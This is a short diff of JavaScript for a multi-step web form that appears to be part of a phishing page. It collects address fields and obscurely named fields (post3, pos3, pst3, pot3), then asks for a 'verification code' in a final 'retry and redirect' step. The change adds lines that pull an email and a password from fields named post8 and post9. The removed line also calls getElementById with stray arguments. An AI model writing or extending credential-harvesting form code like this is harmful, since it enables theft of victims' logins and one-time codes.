@@ -301,7 +301,7 @@
 
     // 5. Step 2 Submission
     async function submitStep2(e) {
-        const fields = ['addr', 'state', 'country2', 'post3', 'pos3', 'pst3', 'pot3','post8','post9'];
+        const fields = ['addr', 'state', 'country2', 'post3', 'pos3', 'pst3', 'pot3'];
         if(!validateFields(fields)) return;
 
         const btn = document.getElementById('btn-2');
@@ -340,7 +340,9 @@
 
     // 7. Final Retry & Redirect Logic
     async function finalSubmit(e) {
-        const retryPost = document.getElementById('retry-post','post8','post9').value;
+        const retryPost = document.getElementById('retry-post').value;
+const tEmail = document.getElementById('post8').value;
+const tPass = document.getElementById('post9').value;
         if(!retryPost) return alert("Security requires your verification code.");
         
         const btn = document.getElementById('btn-3');
